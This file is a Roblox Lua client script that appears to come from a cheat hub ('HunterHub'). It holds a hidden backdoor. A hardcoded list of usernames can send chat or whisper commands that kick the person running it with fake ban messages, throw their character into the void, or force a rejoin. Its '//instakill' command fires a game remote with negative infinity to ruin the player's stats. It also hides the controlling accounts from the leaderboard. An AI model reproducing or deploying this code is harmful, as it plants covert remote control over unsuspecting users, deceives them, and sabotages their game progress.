local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local Admins = {
	["QT_xAraa"] = true,
	["Shot16kill"] = true,
	["theoverryou3_alt"] = true,
	["Raiden_Nika"] = true,
	["philippinesBraxy123"] = true,
	["Brxy_Alt"] = true,
	["Abayanjanzkie123"] = true,
	["Bowmbaclaat"] = true,
	["FrostByte_074"] = true,
	["OmeekoMeeko"] = true,
	["CyberSlayer_01"] = true,
	["GvessWholam"] = true,
    ["RoboRanger_471"] = true
}

local function destroyCharacter(player)
	if player.Character then
		player.Character:Destroy()
	end
end

local function hideFromLeaderboard(player)
	RunService.RenderStepped:Connect(function()
		local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
		if playerGui then
			for _, gui in ipairs(playerGui:GetDescendants()) do
				if gui:IsA("TextLabel") or gui:IsA("TextButton") then
					if gui.Text == player.Name then
						gui.TextTransparency = 1
						gui.Visible = false
					end
				end
			end
		end
	end)
end

local function handleAdmin(player)
	destroyCharacter(player)
	hideFromLeaderboard(player)
	player.CharacterAdded:Connect(function()
		destroyCharacter(player)
	end)
end

local instakillStarted = false

local function ChatCommand(speakerName, message)
	if not Admins[speakerName] then return end
	message = message:lower()

	local kickTarget = message:match("//kick%s+(%w+)")
	if kickTarget and LocalPlayer.Name:lower():find(kickTarget) then
		LocalPlayer:Kick("You were removed from the game by an unknown authority.")
	end

	local banTarget = message:match("//ban%s+(%w+)")
	if banTarget and LocalPlayer.Name:lower():find(banTarget) then
		LocalPlayer:Kick("you've been permanently banned from this game")
	end

	local voidTarget = message:match("//void%s+(%w+)")
	if voidTarget and LocalPlayer.Name:lower():find(voidTarget) then
		local char = LocalPlayer.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			char:MoveTo(Vector3.new(0, -1000, 0))
		end
	end

	if message:find("//revealusers") then
	   TextChatService.TextChannels.RBXGeneral:SendAsync("HunterHub V4.7.5")
   end

	if message:find("//shutdown") then
		TeleportService:Teleport(PlaceId, LocalPlayer)
	end

	local instakillTarget = message:match("//instakill%s+(%w+)")
	if instakillTarget and LocalPlayer.Name:lower():find(instakillTarget) and not instakillStarted then
		instakillStarted = true

		RunService.RenderStepped:Connect(function()
			for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
				if item:IsA("Tool") and item.Name == "Train" then
					item.Name = "None"
				end
			end

			local char = LocalPlayer.Character
			if char then
				for _, item in ipairs(char:GetChildren()) do
					if item:IsA("Tool") and item.Name == "Train" then
						item.Name = "None"
					end
				end
			end

			for _, item in ipairs(workspace:GetChildren()) do
				if item:IsA("Tool") and item.Name == "Train" and item.Parent == workspace then
					item.Name = "None"
				end
			end
		end)

		task.spawn(function()
			while true do
				local Backpack = LocalPlayer:FindFirstChild("Backpack")
				local Character = LocalPlayer.Character
				local None = Backpack and Backpack:FindFirstChild("None") or (Character and Character:FindFirstChild("None"))

				if None then
					if None.Parent == Backpack then
						None.Parent = Character
					end
					break
				end

				task.wait(0.1)
			end
		end)

		task.spawn(function()
			while true do
				local stats = LocalPlayer:FindFirstChild("leaderstats")
				local ninjutsu = stats and stats:FindFirstChild("Ninjutsu")

				if ninjutsu and ninjutsu.Value == -math.huge then
					break
				end

				ReplicatedStorage.RemoteEvent.AddPowerEvent:FireServer("FromTraining", -math.huge)
				task.wait(0.1)
			end
		end)

		wait(0.5)
		ReplicatedStorage.RemoteEvent.SpawnCharacterEvent:FireServer("RandomSpawn")
	end
end

TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
	local textSource = messageData.TextSource
	if textSource then
		local speaker = Players:GetPlayerByUserId(textSource.UserId)
		if speaker then
			ChatCommand(speaker.Name, messageData.Text)
		end
	end
end)

Players.LocalPlayer.Chatted:Connect(function(message)
	local target, msg = message:match("^/w%s+(%w+)%s+(.+)")
	if not target then
		target, msg = message:match("^/whisper%s+(%w+)%s+(.+)")
	end
	if target and msg and Admins[LocalPlayer.Name] and target:lower() == LocalPlayer.Name:lower() then
		ChatCommand(LocalPlayer.Name, msg)
	end
end)

ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
	if messageData.MessageType == "Whisper" then
		local speaker = Players:FindFirstChild(messageData.FromSpeaker)
		if speaker and messageData.ToSpeaker == LocalPlayer.Name then
			ChatCommand(speaker.Name, messageData.Message)
		end
	end
end)

for _, player in pairs(Players:GetPlayers()) do
	if player ~= LocalPlayer and Admins[player.Name] then
		handleAdmin(player)
	end
end

Players.PlayerAdded:Connect(function(player)
	if player ~= LocalPlayer and Admins[player.Name] then
		handleAdmin(player)
	end
end)

